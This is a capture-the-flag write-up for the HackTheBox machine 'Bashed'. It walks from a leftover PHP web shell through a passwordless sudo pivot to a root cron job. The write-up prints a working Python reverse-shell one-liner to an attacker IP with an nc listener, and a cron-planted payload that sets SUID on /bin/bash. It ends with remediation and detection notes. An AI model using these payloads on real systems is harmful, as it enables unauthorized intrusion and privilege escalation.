# HackTheBox — Bashed

> **OS:** Linux (Ubuntu)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-17

**Kill chain:** `web shell left on the server → RCE as www-data → sudo to scriptmanager → writable root cron script → root`

---

## Overview

Bashed is a box about leaving your tools lying around. The developer built a PHP web shell (phpbash), blogged about it, and left it deployed on the same server. That's the whole foothold.

From there it's two steps up. www-data can run anything as `scriptmanager` with no password. And `scriptmanager` owns a directory that root runs scripts out of, on a cron timer. So you become scriptmanager, drop a script root will execute, and wait.

Nothing here is a CVE. Every step is a misconfiguration someone made and forgot about.

---

## Recon

```bash
nmap -sV -sC -p- <ip>
```

One port:

```
80/tcp open  http  Apache 2.4.18 (Ubuntu)   "Arrexel's Development Site"
```

The site is a blog. One post is titled **phpbash**, and the author says he developed it *"on this exact server."* phpbash is a semi-interactive PHP web shell (his own GitHub project). So the tool used to attack the box is probably still sitting on the box.

Content discovery to find it:

```bash
feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
```

`/dev/` has directory listing on, and it contains **`phpbash.php`**.

---

## Foothold — RCE as www-data

Browse to `http://<ip>/dev/phpbash.php` — it's a live web shell running as **www-data**. No exploitation needed; it was left there.

```
www-data@bashed:/# ls /home
arrexel  scriptmanager

www-data@bashed:/# cat /home/arrexel/user.txt
0f698575…[REDACTED]
```

User flag done.

---

## Lateral movement — www-data → scriptmanager

```bash
sudo -l
```

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

www-data can run **any command as scriptmanager, no password**. phpbash is non-interactive, so `sudo -u scriptmanager /bin/bash` won't hold a shell — but a single command works, and a reverse shell lands cleanly:

```bash
# listener on attacker
nc -lvnp 4444

# in phpbash, run the shell AS scriptmanager
sudo -u scriptmanager python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LIP>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Now interactive as **scriptmanager**.

---

## Privilege Escalation — writable root cron script

Standard enumeration turns up a directory owned by scriptmanager that shouldn't be:

```bash
ls -la /scripts
```

```
drwxrwxr--  scriptmanager scriptmanager  .
-rw-r--r--  scriptmanager scriptmanager  test.py
-rw-r--r--  root          root           test.txt   ← root owns the OUTPUT
```

`test.py` is owned by scriptmanager (editable), but `test.txt` — which `test.py` writes — is owned by **root** and keeps updating. That means root runs `test.py`. Confirm it with pspy:

```bash
./pspy64
```

```
UID=0  /usr/sbin/CRON -f
UID=0  /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
UID=0  python test.py
```

There it is: a **root cron job runs every `.py` file in `/scripts`, every minute.** scriptmanager can write to `/scripts`. So root will execute any script I put there.

Drop a payload that flips the SUID bit on bash:

```bash
printf 'import os\nos.system("chmod +s /bin/bash")\n' > /scripts/root.py
```

Wait up to 60 seconds for cron, then:

```bash
ls -l /bin/bash        # -rwsr-sr-x  → SUID set
/bin/bash -p
id                     # euid=0(root)
cat /root/root.txt
```

Root.

> **Why SUID + `-p`:** the SUID bit makes `/bin/bash` run with its owner's privileges (root). Bash normally drops that privilege on launch as a safety measure; `-p` tells it not to. Result: `euid=0`, and root-only files become readable. SUID bash is the reliable payload here — no listener, no quoting problems, works even with egress filtered.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| phpbash web shell left deployed in `/dev/` | **Critical** | Never leave web shells or dev tooling on a production host. Remove `/dev/phpbash.*`. This is unauthenticated RCE to anyone who finds it. |
| Directory listing enabled on `/dev/` | Medium | Disable `Options Indexes` in Apache so directories don't expose their contents. |
| `www-data` can sudo to `scriptmanager` (NOPASSWD: ALL) | High | Remove the sudo rule. A web-server user should never be able to become another account. |
| Root cron executes scripts from a user-writable dir | **Critical** | Root should never run code from a directory a lower-privileged user can write to. Move the scripts to a root-owned path with strict permissions. |

---

## Detection notes (blue-team view)

- **The web shell is loud in web logs.** Requests to `/dev/phpbash.php` with command output, and the initial `/dev/` directory-index hit, are both easy to alert on. A POST/GET to a `.php` file that spawns `sh`/`bash` children under `apache2` is high-signal — a webserver process should not be spawning shells.
- **Process lineage catches the whole chain.** `apache2 → sh → sudo -u scriptmanager → python3 → bash` is an obvious anomaly in EDR/`auditd`: a web server user pivoting via sudo to another account and launching an interpreter with a network connection.
- **The cron abuse has a clean host signal.** A `chmod +s /bin/bash` (SUID change on a system binary) is exactly what file-integrity monitoring exists to catch. So is a **new/modified `.py` in `/scripts`** immediately before root's cron runs. Watching for SUID-bit changes on core binaries would flag this instantly.
- **`sudo` logs the pivot.** The `www-data → scriptmanager` sudo call is recorded in `/var/log/auth.log`; a service account using sudo at all is worth alerting on.

---

## Lessons

- **Attackers reuse what you left behind.** The foothold was the developer's own tool, still on the server. Recon is often just finding what shouldn't be there.
- **`sudo -l` first, always.** The lateral move was a one-line sudo misconfig, found in the first command of local enum.
- **When a static misconfig isn't obvious, something's running on a timer.** The privesc wasn't a SUID binary or a sudo rule — it was a cron job. pspy is how you see scheduled root activity you can't read directly.
- **Writable dir + privileged execution = game over.** It doesn't matter that `/scripts` looked boring. What matters is *who writes there* and *who runs what's inside*.
